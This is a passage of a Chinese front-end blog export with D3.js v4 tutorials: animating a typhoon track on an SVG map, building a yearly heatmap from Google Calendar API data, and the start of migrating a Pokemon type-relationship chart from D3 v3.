const &#123; pastData, currData, fcstData &#125; = require(&#x27;./parsedWeatherData.json&#x27;);//...constructor() &#123;   super()   this.state = &#123;     worlddata: [],     typhoonPath: [...pastData, ...currData, ...fcstData],     marker: &#123; name: &quot;201701&quot;, coordinates: pastData[0].coordinates &#125;,   &#125; &#125;

順便加上一個 marker，用來代表颱風本體，以路徑圖的第一個位置為其座標起始點。
接著我們另外寫一個 renderLine() function 來處理路徑繪製的部分，因為待會還會需要加上動畫效果，會複雜一些：
renderLinerenderLine() &#123;    // 座標映射    const pathCoordinates = [];    this.state.typhoonPath.forEach((path, i) =&gt; &#123;      pathCoordinates.push(&#123;        x: this.projection()(path.coordinates)[0],        y: this.projection()(path.coordinates)[1]      &#125;);    &#125;);        // 線段繪製函數    const lineFunction = d3Line()      .x((d) =&gt; d.x)      .y((d) =&gt; d.y)      .curve(curveCatmullRom);    // 增加 svg 元素    // add path    d3Select(&#x27;svg&#x27;)      .append(&#x27;g&#x27;)      .append(&#x27;path&#x27;)      .attr(&#x27;class&#x27;, &#x27;typhoonPath&#x27;)      .attr(&#x27;d&#x27;, lineFunction(pathCoordinates))      .attr(&#x27;fill&#x27;, &#x27;none&#x27;)      .attr(&#x27;stroke&#x27;, &#x27;red&#x27;)      .attr(&#x27;stroke-width&#x27;, &#x27;5px&#x27;);    // add marker    d3Select(&#x27;svg&#x27;)      .append(&#x27;g&#x27;)      .append(&#x27;circle&#x27;)        .attr(&quot;transform&quot;, () =&gt; &#123;            const x = this.projection()(this.state.marker.coordinates)[0]            const y = this.projection()(this.state.marker.coordinates)[1]            return `translate($&#123;x&#125;, $&#123;y&#125;)`;        &#125;)        .attr(&#x27;r&#x27;, 10)        .attr(&#x27;fill&#x27;, &#x27;yellow&#x27;)        .attr(&#x27;opacity&#x27;, 0.7)        .attr(&#x27;class&#x27;, &#x27;typhoonMarker&#x27;);    const linePath = d3SelectAll(&#x27;path.typhoonPath&#x27;);      &#125;

繪製路線的 renderLine() 可以拆成三部分來說明：

座標映射： 由於我們自己 parse 的路徑資料並非 TopoJSON，而且還區分成不同時間的資料，所以我們先個別將路徑映射好座標點，再串接到一個 Array 中，方便後續繪製。 我們先前提到的 projection() 非常好用，只要傳入一個含有 x, y 經緯度的物件，就能幫我們在設定的 scale 中映射出對應位置：this.projection()(path.coordinates)，會回還一個 Array，分別為經度和緯度。

線段繪製函數： 在 D3.js 中，attribute 可以傳入 function，這邊我們利用 d3-shape 中的 line（ code 裡面的 d3Line 是我 import 後的變數名稱)來幫忙將映射後的座標 x, y 轉換成 svg path 的 d value。 其中 curve 是 d3-shape.line 的補間函數，簡單來說就是決定線段中，每個 點 與 點 之間該怎麼 連接，看過這個對照應該會比較能了解： v4 curve interpolation comparison 

增加 svg 元素： 這就是最基本的步驟囉，d3-select 出 svg 後，再 append 上我們要的 line path 與 marker，有寫過 D3.js 的勢必不陌生。


在 componentDidMount() 的地方加上 renderLine() 函數，就可以看到如下結果：


繪製動態路線 - 加上動態路徑效果接著我們要讓這個路徑 活起來！
要讓 svg 線段有動畫般的效果其實很簡單，利用 svg 的 stroke-dasharray 這個屬性即可，詳細的實作原理可以看 css-tricks 上的這篇文章 How SVG Line Animation Works，解釋的非常清楚，只是裡面說的做法是透過 CSS 的 animation，跟我們這邊有些微差異，但是原理是相同的。

重點就在於，將原始的 **直線** 轉換為 **虛線**，透過改變該虛線的 **dasharray** 區間，來做出動態的效果。


stroke-dasharray 的參數是 ( dash 的長度, gap 的長度 ))，我們只要固定 gap 的長度為線段長，然後讓 dash 的長度從零慢慢轉換成線段長即可達到動畫效果！
所以我們加上一個 transition 函數：
transitiontransition(linePath) &#123;    const self = this;    linePath.transition()      .duration(15000)      .attrTween(&quot;stroke-dasharray&quot;, this.translateFn.bind(this, linePath))      .on(&#x27;end&#x27;, () =&gt; &#123;        setTimeout(() =&gt; &#123;           d3Select(this).call(self.transition.bind(self, linePath)); // infinite loop        &#125;, 1500);      &#125;);&#125;

linePath 是 d3-select 到的路徑 path 元件。透過 transition() 與 attrTween() 來動態調整 stroke-dasharray 的值，並且在最後監聽一個 end 事件，也就是當每次動畫結束以後，我們隔個 1.5 秒再重新呼叫一次 transition()，進行 loop。
[Note]這邊要注意的是，linePath 雖然是透過 d3-select 取得的元件，要呼叫他的 transition() 函式的話，會需要額外加入 d3-transition 的 lib 才行，他會將 transition bind 到元件中：import &#123; transition as d3Transition &#125; from &#39;d3-transition&#39;;
attrTween 會將 transition 過程中的時間當作參數丟進去給它的 value，而該 value 扮演著處理 補間動畫 的角色，是一個 input 為時間的補間函式，我們這邊執行一個translateFn()，用來處理我們補間動畫過程中需要做的事情，以及定義補間動畫函式的內容：
translateFntranslateFn(linePath) &#123;    const self = this;    // 回傳 input 為 time 的補間函式    return (t) =&gt; &#123;        const l = linePath.node().getTotalLength();        const p = linePath.node().getPointAtLength(t * l);        const marker = d3Select(&#x27;.typhoonMarker&#x27;);        marker.attr(&quot;transform&quot;, `translate($&#123;p.x&#125;, $&#123;p.y&#125;)`);        marker.style(&quot;transition&quot;, &#x27;r 1.5s&#x27;);        marker.attr(&quot;r&quot;, 10);        const interpolate = d3Interpolate(`0,$&#123;l&#125;`, `$&#123;l&#125;,$&#123;l&#125;`);        return interpolate(t);    &#125;&#125;

如同先前提到的，我們要改變 stroke-dasharray 的區間，也就是要讓第一個參數，dash 的長度遞增為線段長，線段長度可以從 linePath.node().getTotalLength() 取得，透過 d3-interpolate 幫助我們產生一個補間函式 interpolate(t)，補完 0, 線段長 -&gt; 線段長, 線段長 這段參數的變化，並且回傳出去給 attrTween。
d3 的文件都顯得蠻詳細的，d3-interpolate 這邊有說明不同的 input type 會採用不同的補間函式來處理，例如字串、時間、數字等等。
加上了這個 tranlsateFn 後，線段就活起來了！


在剛剛的 translateFn 中我們其實還做了一件事情，就是讓 Marker 跟著線段移動，透過 const p = linePath.node().getPointAtLength(t * l); 取得線段在該時間的 point 位置，並 transform 過去。
但這樣還不夠，既然是想要有颱風路徑的效果，怎麼可以缺少了暴風半徑的資訊呢？
記得我們原本 parse 出來的資料中有個 radius 的值嗎？我們可以在 translateFn 中抓出目前資料的半徑值，然後放到 marker 的 r attribute 中：
self.state.typhoonPath.forEach((path) =&gt; &#123;        const pixelLocSource = self.projection()(path.coordinates);        if (Math.floor(p.x) === Math.floor(pixelLocSource[0])) &#123;          const radius = this.distanceCalculate(pixelLocSource, path.coordinates, path.radius);          marker.attr(&quot;r&quot;, radius);        &#125;      &#125;);

但這邊還有個小問題，資料中，半徑的單位是 km，我要怎麼讓它轉換成 svg 中的距離呢？！我們之前的投影函式 projection() 只能接受座標參數，沒辦法直接轉換距離啊！
別慌張，那我們就先計算出中心點到這段半徑後的座標，在轉換成地圖上的點，接著利用國高中數學計算出距離即可！
distanceCalculatedistanceCalculate(pixelLocSource, [longitude, latitude], distance)&#123;	    // Latitude: 1 deg = 110.574 km    // Longitude: 1 deg = 111.320*cos(latitude) km    const lat_diff = distance / 110.574;    const lon_distance = 111.320 * Math.cos(latitude * Math.PI / 180);    const lon_diff = distance / lon_distance;      const E = longitude + Math.abs(lon_diff);    const pixelLoc = this.projection()([E, latitude]);    // distance calculate    return Math.sqrt(Math.pow(pixelLocSource[0] - pixelLoc[0], 2)        + Math.pow(pixelLocSource[1] - pixelLoc[1], 2));&#125;

取巧的點是，利用已知的經緯度距離來做運算：    Latitude: 1 deg &#x3D; 110.574 km    Longitude: 1 deg &#x3D; 111.320*cos(latitude) km &#x2F;&#x2F; 該緯度上每一個經度的距離算法
pixelLocSource 是映射過後的中心點位置，[longitude, latitude] 則是中心點的原始經緯度，而 distance 就是我們要算的暴風半徑。由於我們並不需要算出真正半徑內每個點的經緯度，所以這邊我只抓該緯度上的精度來做投影計算，找出該半徑後的精度，再套用普通的兩點距離公式。
（其實這是我想出來比較暴力的解法啦，歡迎知道有更簡單更好的方式映射距離的朋友告知我！非常感謝）
最後的成果（將 scale 調大比較看得出來半徑變化）：


結論：
要讓路徑在地圖上動起來並不困難，而且透過 D3.js 的補間函式也能讓你在補間過程中偷做許多手腳，像是我最一開始的範例中還有多判斷資料的時間，針對不同時間留下颱風半徑範圍圖等等。本篇的重點在於如何單純透過 D3.js v4 與 svg 的操作來製作出地圖上的動態線段，其他像是基本的經緯度線段 (graticule) 礙於篇幅關係就不細談，相信大家可以從我最一開始的範例中看出是如何製作的。希望本文能對想用 svg 繪製動態路線圖的讀者有所幫助，若文中有任何錯誤也歡迎指正！
資料來源
Natural Earth
topojson
How SVG Line Animation Works
SVG Paths and D3.js
TWEENING CUSTOM SHAPES AND PATHS IN D3.JS
SVG D3.js - 繪製線段
D3.js Path Data Generator Line Example
v4 curve interpolation comparison

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>d3</tag>
        <tag>map</tag>
        <tag>animation</tag>
        <tag>svg</tag>
      </tags>
  </entry>
  <entry>
    <title>一起用 Google Calendar 與 D3.js 進行年終回顧吧！</title>
    <url>/2017/12/12/d3v4-calendar-yearendreview/</url>
    <content><![CDATA[前言大概是在 2016 年底的時候，我整個人的心理狀態很糟，一直覺得自己對生活的掌控力非常低落，庸庸碌碌的過著每一天，卻不曉得自己的目標在哪，對什麼都興致缺缺，似乎把生活遺失了。
我試著想從過往日常生活中的所作所為來找出一些癥結點，結果發現記憶有限，越想越覺得自己好像什麼都沒完成，接著就進入無止盡的負面迴圈…
為了打破這樣的心理狀態，我從 2017 年的一月開始記錄自己每天的生活，將一整天所做的事項記錄在 Google Calendar 中，有了這樣的紀錄後，我每週都會回顧一下自己這一整個星期所做的事情，花在工作、運動、娛樂、學習等等的時間如何，讓自己在負面情緒滿漲時，能看看自己其實還是達成了不少事，同時也能隨時警惕自己在時間管理與各種事項間的分配是否有需要調整的部分。
好啦，說穿了就是用 Google Calendar 寫日記。
而現在又接近年底了，在這近乎一年的紀錄中，我想應該可以來做個 Year End Review，利用 D3 來幫助我將記錄在 Google Calendar 上的資料視覺化出來！
大致的想法是將不同分類的資料整理出來，然後看看 我在這一年當中，每一天花在每一個類別的事項的 Heat Map 會是長什麼樣子，並加上簡單的 Select box 方便切換。
成果截圖如下：

有興趣的可以連結到 bl.ocks 看 Demo 與完整的程式碼
資料視覺化的第一步，當然是取得資料Google 存了多少資料想必大家都心知肚明，而他老大哥也是願意把我們的資料還給我們，只要連結到 Google Takeout 就可以將你在 Google 服務上的資料副本下載下來：

既然我要視覺化我在 Google Calendar 上的資料，當然就是選取 Calendar 來下載：

或著，你也能直接從 Google Calendar 匯出你的日曆：

仔細看一下，這兩種方式下載到的資料其格式都是 iCalendar。
是 iCalendar 又如何呢？通用的標準格式不是很好嗎？代表我之後若換成 Apple 的 iCal，我這次的專案也能套用上去耶！
But!
在我當初紀錄日曆時，我每一項 item 的資訊很少，就只是單純的填入 Summary，並且依照分類給予顏色。
而在 iCalendar 的標準中，並沒有 Google Calendar 的顏色資訊，所以我只好忍痛放棄這條方便的道路…（這告訴我們做事還是不能太懶）
iCalendar 的內容大概長這樣，以 BEGIN:VEVENT 開始，END:VEVENT 為止：
BEGIN:VEVENTDTSTART;VALUE=DATE:20171209DTEND;VALUE=DATE:20171210DTSTAMP:20171210T075750ZUID:839skadkfcd03812j3f0c030s0s@google.comCREATED:20171210T024308ZDESCRIPTION:LAST-MODIFIED:20171210T024310ZLOCATION:SEQUENCE:0STATUS:CONFIRMEDSUMMARY:運動（主：背）TRANSP:TRANSPARENTBEGIN:VALARMACTION:DISPLAYDESCRIPTION:This is an event reminderTRIGGER:-F0AB0H30C0DEND:VALARMBEGIN:VALARMACTION:EMAILDESCRIPTION:This is an event reminderSUMMARY:Alarm notificationATTENDEE:mailto:arvin0731@gmail.comTRIGGER:-F0AB0H30C0DEND:VALARMEND:VEVENT

既然是 Google，就會有 API沒辦法直接載到資料，那就從 API 取得吧！
Google 最棒的一點就是有一堆 API，而為人詬病的剛好是這些 API 常常沒有完善的 Doc。
幸運的是，Google Calendar API 的文件還蠻好懂的，因為給了一個直接可以複製來用的範例 Sample（笑
直接照著步驟做就可以了，他有很多實作版本，我是用熟悉的 Node.js 來幫我爬取資料。
唯一要注意的是步驟一中的 this wizard 要好好照著說明執行，即便他步驟看起來有些匪夷所思，像是要你到某一頁後按下 Cancel button (eg. On the Add credentials to your project page, click the Cancel button.)
當你設定好一切，取得 OAuth2 需要的 credentials 後，可以參照他下面的範例依據你想要的資料作修改，比較關鍵的程式是這幾行：
var calendar = google.calendar(&#x27;v3&#x27;);var queryOptions = &#123;    auth: auth,    calendarId: &#x27;primary&#x27;,    timeMax: (new Date()).toISOString(),    singleEvents: true,    orderBy: &#x27;startTime&#x27;,    maxResults: 2500 // 不給 maxResults 的話，預設值就是 2500&#125;;if (pageToken) &#123;    queryOptions.pageToken = pageToken;&#125;calendar.events.list(queryOptions, function (err, response) &#123;    // ... 從 response 中取得需要的資料    // var events = response.items;&#125;

我們使用的是 v3 的 google calendar api，利用 calendar.events.list 可以取得某個 Calendar 的 events 列表，在 queryOptions 中，比較重要的有下面幾個:
auth 就是你在 this wizard 中產生的 credentials，你在頁面上就能找到下載 json 的連結：

calendarId 是你想抓取的 Calendar 名稱，primary 指的是你登入帳號的主要日曆。
timeMax (or timeMin) 可以用來規範你想抓取哪段時間內的 events。
最後是 pageToken，由於 Google Calendar API 有限制，你一次最多只能抓取 2500 個 events，即便你有設定 maxResults 這個參數也一樣。因此你會需要透過每次 API request 回傳的 nextPageToken 來進行下一頁的 Query。（沒錯，response 回來的是 nextPageToken，但你下 Query 時帶的是 pageToken，請注意！）
可以設定的參數還非常多，可以從 Google 提供的 API Explorer 中選取 Calendar API 來測試看看哪樣的參數是你需要的！每個參數都有對應的說明，還算清楚。
我在這部分的實作放在 Gist 上，有興趣可以參考，寫得很暴力簡陋，畢竟這不是這次的重點～
主要是依照日曆中每筆 Event 的時間與顏色做分類與統計，依照不同顏色（也就是不同類別）分別存放到不同檔案。
資料格式也很簡單：
date,colorIdNum2017-10-10,12017-10-11,12017-10-12,12017-10-13,12017-10-14,12017-10-15,1......

資料有了終於能開始畫圖了！主要參考 Mike Bostock 大神的作品，改成只繪製單一年度圖表，並加上切換資料後的動畫。
接下來是手把手說明：
我們總共需要三個 Function：DrawCalendar、UpdateCalendar 與 changeDataSrc，分別用來繪製圖表、更新圖表與更新資料。
最主要的當然就是 DrawCalendar。繪製日曆又可分為三個步驟：
Steps I: 設定日曆基本外觀（大小、顏色、svg container）function DrawCalendar(dataSrc) &#123;  var width = 960,      height = 136,      cellSize = 17;  var formatPercent = d3.format(&quot;d&quot;);  var color = d3.scaleQuantize()      .domain([0, 10])      .range([&quot;#006837&quot;, &quot;#1a9850&quot;, &quot;#66bd63&quot;, &quot;#a6d96a&quot;, &quot;#d9ef8b&quot;, &quot;#ffffbf&quot;, &quot;#fee08b&quot;, &quot;#fdae61&quot;, &quot;#f46d43&quot;, &quot;#d73027&quot;, &quot;#a50026&quot;]);  // ...  // ..  // .&#125;

上面這段很單純的就是設置好圖表的基本資訊，包含寬、高與日曆中每”天”的格子大小，利用 d3.scaleQuantize() 創建一個 color 函數，用來將之後的資料映射到對應的顏色。
這邊有個 d3.format(&quot;d&quot;) 的函數，其實在這邊用不到，但還是想介紹一下。d3.format() 是個方便你正規化資料數值的函式，例如你想將數值侷限在小數點後兩位，就可以用 d3.format(&quot;2f&quot;)，或是想轉換成百分比，可以用 d3.format(&quot;.2%&quot;)，這樣會將你輸入的數值乘上 100 後，再加上百分比符號，並依照 % 前的數字來決定小數點後的位數。
eg. d3.format(“.2%”)(0.234) &#x3D;&#x3D;&#x3D; 20.34% (可參考此網站說明)
接著是繪製主要的 calendar chart svg container：
var svg = d3.select(&quot;#calendar-chart&quot;)      .selectAll(&quot;svg&quot;)      .data(d3.range(2017, 2018))      .enter().append(&quot;svg&quot;)      .attr(&quot;width&quot;, width)      .attr(&quot;height&quot;, height)      .append(&quot;g&quot;)      .attr(&quot;transform&quot;, &quot;translate(&quot; + ((width - cellSize * 53) / 2) + &quot;,&quot; + (height - cellSize * 7 - 1) + &quot;)&quot;);  svg.append(&quot;text&quot;)      .attr(&quot;transform&quot;, &quot;translate(-6,&quot; + cellSize * 3.5 + &quot;) rotate(-90)&quot;)      .attr(&quot;font-family&quot;, &quot;sans-serif&quot;)      .attr(&quot;font-size&quot;, 10)      .attr(&quot;text-anchor&quot;, &quot;middle&quot;)      .text(function (d) &#123; return d; &#125;);

d3.range() 會回傳根據你傳入的區間，回傳一段連續數值陣列。
我們利用 d3.range(2017, 2018) 取得陣列資料，會回傳長度為一，包含 2017 這個數值的陣列 [2017]。
你可能會想，為什麼我要這樣做？
只需要一年的資料，就直接 append svg 就好呀，何必 binding 2017 這個值到 svg 的 __data__ 裡面呢？
賣個關子，待會看到 Steps II 你就會知道了！
而剩下的部分就是利用 transform 來位移 svg，為整個圖表保留空間，並加上文字標記。
Steps II: 繪製日曆中的每一天（也就是每個小格子啦～）var rect = svg.append(&quot;g&quot;)  .attr(&quot;fill&quot;, &quot;none&quot;)  .attr(&quot;stroke&quot;, &quot;#ccc&quot;)  .selectAll(&quot;rect&quot;)  .data(function (d) &#123; return d3.timeDays(new Date(d, 0, 1), new Date(d + 1, 0, 1)); &#125;)  .enter().append(&quot;rect&quot;)  .attr(&quot;width&quot;, cellSize)  .attr(&quot;height&quot;, cellSize)  .attr(&quot;x&quot;, function (d) &#123; return d3.timeWeek.count(d3.timeYear(d), d) * cellSize; &#125;)  .attr(&quot;y&quot;, function (d) &#123; return d.getDay() * cellSize; &#125;)  .datum(d3.timeFormat(&quot;%Y-%m-%d&quot;));  svg.append(&quot;g&quot;)    .attr(&quot;fill&quot;, &quot;none&quot;)    .attr(&quot;stroke&quot;, &quot;#000&quot;)    .selectAll(&quot;path&quot;)    .data(function (d) &#123; return d3.timeMonths(new Date(d, 0, 1), new Date(d + 1, 0, 1)); &#125;)    .enter().append(&quot;path&quot;)    .attr(&quot;d&quot;, pathMonth);

要繪製出一年中的 “每一天”，我們可以直接 for loop 跑 365 次，或是產生 365 筆資料，但更聰明的做法是利用 d3-time 提供的 timeDays 函數 來幫我們產生出特定日期區間的日期資料！
d3.timeDays(new Date(d, 0, 1), new Date(d + 1, 0, 1));
其中 new Date() 的第一個參數 d 代表年，0 代表第一個月（月份從 0 開始），1 則是第一天，因此這邊會回傳 d 年到 d + 1 年間的每一天。
好那問題來了，這個 d 是什麼呢？
要回答這個問題，必須先了解一下 d3 中的 selection.data()。
我以前都以為 data() 只能夠丟入資料陣列，但是在這次的實作過程中才發現，原來他可以接受函數！
但他是怎麼運作的呢？我們偷看一下 d3-selection 的原始碼

真的蠻有趣的，他其實是先判斷你傳入的 value 是不是函數，若不是，會先利用 constants() 將你的值包裹過，讓他變成可執行的函數：
constants.jsexport default function(x) &#123;  return function() &#123;    return x;  &#125;;&#125;

他會將 parent.__data__ 傳入該函數中執行，回傳的就會是該 selector 的 __data__。所以直接傳入 function 也是可行的！
以我們的例子來說，rect 的 parent 就是 svg，而你們記得在 Steps I 時，我們 binding 陣列 [2017] 到 svg 的 __data__ 中嗎？這邊就派上用場了！在 rect 的 data() 中的函數所接收到的 d 值就是 2017。
而上述的 d3.timeDays(new Date(d, 0, 1), new Date(d + 1, 0, 1)); 就會回傳 2017 到 2018 中間 365 筆的日期資料！我們也因此得到 365 個小方塊啦！
接著，利用類似的概念，使用 d3.timeMonths() 產生 12 筆月份資料，接著實作 pathMonth() 來畫出 svg path：
pathMonth()function pathMonth(t0) &#123;  var t1 = new Date(t0.getFullYear(), t0.getMonth() + 1, 0),    d0 = t0.getDay(), w0 = d3.timeWeek.count(d3.timeYear(t0), t0),    d1 = t1.getDay(), w1 = d3.timeWeek.count(d3.timeYear(t1), t1);  return &quot;M&quot; + (w0 + 1) * cellSize + &quot;,&quot; + d0 * cellSize    + &quot;H&quot; + w0 * cellSize + &quot;V&quot; + 7 * cellSize    + &quot;H&quot; + w1 * cellSize + &quot;V&quot; + (d1 + 1) * cellSize    + &quot;H&quot; + (w1 + 1) * cellSize + &quot;V&quot; + 0    + &quot;H&quot; + (w0 + 1) * cellSize + &quot;Z&quot;;&#125;

這段邏輯看似複雜，其實很直覺。
d3.timeWeek.count(start, end) 可以計算出 start 到 end 這兩個日期間有幾週。
t0 是目前傳入的時間，依照 d3.timeMonths() 的產出，會是一個月的第一天，t1 則是該月的月底。d0 與 d1 就是單純的 t0、t1 對應的 day，就是星期幾。w0 算出從 t0 該年的第一天到 t0 有幾週，依此類推 w1 就是相對於 t1。
用這些數值就能夠 M(移動) 到月初的位置，並往下移動 7 天 V 7*cellSize，接著在水平位移(H) 到月底的位置，然後垂直位移到月底日期的星期位置(d1 +1) * cellSize，最後為到原點把整個月份框起來。
svg path 的繪製方法可以[參考這篇](http://www.oxxostudio.tw/articles/201406/svg-04-path-1.html。
到目前為止可以畫出如下的圖：

Steps III: 該開始 Binding 資料了再來算是最後一步了，我們將資料綁定並填入剛剛產生的格子中！
d3.csv(dataSrc, function (error, csv) &#123;  if (error) throw error;  var data = d3.nest()    // 將 date 抽到外層當 key    .key(function (d) &#123; return d.date; &#125;)    // 透過 rollup 將 value 設為 colorId    .rollup(function (d) &#123; return +d[0].colorIdNum; &#125;)    .object(csv);  rect.filter(function (d) &#123;    return d in data; // 找出有 match 到的日期，表示那天我有做事 XD  &#125;)    .attr(&quot;fill&quot;, function (d) &#123; return color(data[d]); &#125;)    .append(&quot;title&quot;)    .text(function (d) &#123; return d + &quot;: &quot; + formatPercent(data[d]); &#125;);&#125;);

這邊主要就兩個步驟，第一步先用 d3.nest 來整理資料，我們需要把陣列中每筆資料的 “date” 抓出來當 Key，如此一來，在第二步中，我們可以直接利用 d in data 的語法在 selection.filter() 中進行過濾，選出 365 個格子中，哪些有跟我們真正的 csv 日期資料 match，有 match 到的格子，我們填入顏色！（使用最前面的 color 函數來做映射）
填入和顏色後：

Steps IV: 加入動態切換資料的功能最後我們實作一下綁定在 &lt;select&gt; 元素上的 onchange 函數來做資料切換，而在圖表方面，我們只需要選取出 rect 並重新 filter 資料即可：
// 切換資料function changeDataSrc() &#123;  var x = document.getElementById(&quot;dataSrcSelector&quot;).value;    UpdateCalendar(`calendarData-$&#123;x&#125;.csv`);&#125;// 更新圖表，加上 `transition()` 與 `duration()` 讓過程滑順一些function UpdateCalendar(dataSrc) &#123;  // ...  // ..  d3.selectAll(&#x27;rect&#x27;).filter(function (d) &#123;    return d in data;  &#125;)    .transition()    .duration(500)    .attr(&quot;fill&quot;, function (d) &#123; return color(data[d]); &#125;);    d3.selectAll(&#x27;rect&#x27;).filter(function (d) &#123;    return !(d in data);  &#125;)    .transition()    .duration(500)    .attr(&quot;fill&quot;, function () &#123; return &#x27;#fff&#x27;; &#125;);&#125;

成果Demo 與完整的程式碼
嗯～看起來我工作頗認真，不過等等…怎麼好像週末顏色都比較深啊哈哈哈…哈哈..哈..嗚嗚嗚
結論當初開始在 Google Calendar 上紀錄日誌時，並沒有想到可以在年終的時候進行整年的 review，所以每天的紀錄都很隨性，並沒有很完整的進行分類，有些可惜，但還是能透過資料視覺化的結果，看出我在時間分配的掌控度有相當的進步空間，像是花在工作與培養額外興趣（娛樂）的時間有蠻大的落差。
不管怎麼說，有了這次的經驗，相信明年的 Year End Review 會更好！如果你也覺得這樣做有趣，或許可以加入我的行列，也或許想想有什麼方式可以為你自己進行一次年終 Review，相信都會有所收穫！
資料來源
d3 formatting
d3-time
d3-array
d3-collection
MDN Date
mbostock calendar view
Google Calendar API

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>d3</tag>
        <tag>google</tag>
        <tag>google calendar api</tag>
      </tags>
  </entry>
  <entry>
    <title>用 D3.js v4 看 Pokemon 屬性表</title>
    <url>/2016/08/20/d3v4-pokemon-weaknesses/</url>
    <content><![CDATA[自從 Pokemon Go 在台灣可以玩後，勾起了我許多兒時回憶，因此除了跟著大家一起抓神奇寶貝以外（對我就是不想講寶可夢啊啊啊），我也稍微去追了一下最新版的神奇寶貝動畫，似乎是在打什麼卡洛斯聯盟，也出現了好奇怪的 Mega 進化，會讓神奇寶貝在戰鬥中轉屬性…
咳咳，等等，再講下去這整篇都是神奇寶貝了…
總之，看到會轉屬性這件事情就讓我想到，我小時候從來都沒有認真研究過哪種屬性剋哪種屬性，只知道基本的水剋火之類的，於是乎決定來好好研究一下，順便練習已經出來一陣子的 D3 v4，看看差異性在哪。
幸運的是，當我在搜尋 Pokemon 的 API 時，發現 http://filipekiss.github.io/pokemon-type-chart/ 這個人已經把我想做的做完了 XD 也做得不錯。不過是兩三年前的專案，用的是 D3 v3。雖然點子已經被做完了，但臨摹也是一種學習，所以我們就來把它 Migrate 到 D3 v4，順便看看有哪些值得注意的地方吧！
想直接看 code 的在這邊… 成果 與 程式碼
介紹

這張圖乍看之下我原本以為是修改自 Chord Diagram，但其實是來自於 Cluster。想想也對，屬性間的關係的確類似於階層樹狀，也不需要有比例分佈對應。( 從程式碼看來，原作者應該是修改自 https://bl.ocks.org/mbostock/7607999 )
使用方法很簡單，只要點擊某個屬性，就會列出該屬性對哪些屬性較為強勢 (Strong)、弱勢 (Weak) 或是 免疫 (Immune)，同時點擊兩種屬性的話，就會秀出擁有雙重屬性的結果為何。
解析由於 D3 v4 的變動幅度很大，為了模組化，將很多 packages 都拆出來，替代以往使用 namespace 的方式，因此最單純的 Migration 方式就是直接重刻並設法 re-use 原來的 code。
首先，基本的 index.html 內定義好圖要畫在哪裡，並加上一個 reset button 來還原圖表狀態：
&lt;div id=&quot;typeChart&quot;&gt;  &lt;div id=&quot;graph&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;button class=&quot;button reset&quot;onclick=&quot;reset()&quot;&gt;reset&lt;/button&gt;

接著，我們需要先定義 layout，這邊使用 Cluster Layout，在原本的 D3 v3 版本中，使用的方式為：
v3.jsvar diameter = 750,    radius = diameter / 2,    innerRadius = radius - 120;var cluster = d3.layout.cluster()    .size([360, innerRadius])    .sort(null)    .value(function(d) &#123; return d.size; &#125;);
然而，v4 模組化後，原本的 namespace 都不需要了，因為實際上是個別存放在一個 lib 底下，以 Layout 來說 會放在 d3-hierarchy，而使用方式則變成直接呼叫 d3.cluster() 即可，原有的 sort(), value()等 method 也都移到 node 這個層級底下了（後面會在講到 node）：
v4.js// 定義圖形的基本設定值var diameter = 750,    radius = diameter / 2,    innerRadius = radius - 120;var cluster = d3.cluster()    .size([360, innerRadius]);
寫好圖形的基本設定值後，先把我們已知的 svg 放上去吧！我們先把剛剛定義好的 diameter, radius 的值 append 到最外層的 graph div 上，接著先把待會會用到的四種 svg group 先記錄起來，分別有 immune (免疫)、weak (弱勢)、strong (強勢)、node (屬性)
weaknesses-graph.jsvar svg = d3.select(&quot;#typeChart &gt; #graph&quot;).append(&quot;svg&quot;)    .attr(&quot;width&quot;, diameter)    .attr(&quot;height&quot;, diameter)    .append(&quot;g&quot;)    .attr(&quot;transform&quot;, &quot;translate(&quot; + radius + &quot;,&quot; + radius + &quot;)&quot;);var immune = svg.append(&quot;g&quot;).selectAll(&quot;.immune&quot;),    weak = svg.append(&quot;g&quot;).selectAll(&quot;.weak&quot;),    strong = svg.append(&quot;g&quot;).selectAll(&quot;.strong&quot;),    node = svg.append(&quot;g&quot;).selectAll(&quot;.node&quot;);

我蠻喜歡這樣的寫法，將與資料繪製較無關（相對較固定）的程式碼先寫好，接著再利用 d3.json 將資料讀入後去繪製。
Draw-graphd3.json(&quot;types.json&quot;, function(error, classes) &#123;    var nodes = cluster(d3.hierarchy(packageHierarchy(classes))).children;    var immunes = typeImmune(nodes);    var strengths = typeStrong(nodes);    var weaknesses = typeWeak(nodes);    // draw path    ......    ....    ..    //Make the immune links    function typeImmune(nodes) &#123;    var map = &#123;&#125;,        immunes = [];    nodes.forEach(function(d) &#123;        map[d.data.name] = d;    &#125;);    nodes.forEach(function(d) &#123;        if (d.data.immunes) d.data.immunes.forEach(function(i) &#123;            immunes.push(&#123;                source: map[d.data.name],                target: map[i]            &#125;);        &#125;);    &#125;);        return immunes;    &#125;    // 以下先省略&#125;);
解釋一下上面這段程式碼，我們的資料存放在 types.json 中，利用 d3.json 將資料讀出後，會先做兩件事情：

將資料轉化成 hierarchy 格式，並初始化 cluster
將產生的 nodes 轉化並分類成 immunes, strengths, weaknesses。

這邊的 packageHierarchy 主要是將 raw data 整理成有父子關係的 structure，並且給予每筆資料自己的 key 與 name。（詳細程式碼可以到最後的連結看，這部分比較跟資料格式相關，就不放在這裡佔版面了）
在原本 v3 的做法裡，如果我們要把資料轉化成 hierarchy 的格式，可以直接利用 cluster.nodes() ，即可一次初始化 cluster 並且得到擁有 x, y 值 的 nodes，但在 v4 中，我們必須先利用 d3.hierarchy() 將資料轉化成 hierarchy 格式，建立好父子關係與每個 node 的深度，接著才能丟入 cluster 中初始，其回傳值才會是擁有對應 cluster 內 x, y 值的 nodes。
window.nodes = cluster(d3.hierarchy(packageHierarchy(classes))).children;(這邊取 children 也只是資料格式的關係)
由於繪製 svg path 需要給訂 data 的 source 與 target，因此這邊利用 typeImmune, typeStrong, typeWeak 來作轉換，也將資料分為這三種關係的 path 來繪製。
接著，轉換好後就能根據 node 的 source 與 target 繪製 path。
draw-path// 這邊只列出一種window.immune = immune        .data(immunes.map(function(node)&#123;            return node.source.path(node.target);        &#125;))        .enter().append(&quot;path&quot;)        .each(function(d) &#123;            d.source = d[0], d.target = d[d.length - 1];        &#125;)        .attr(&quot;class&quot;, &quot;immune&quot;)        .attr(&quot;d&quot;, line);

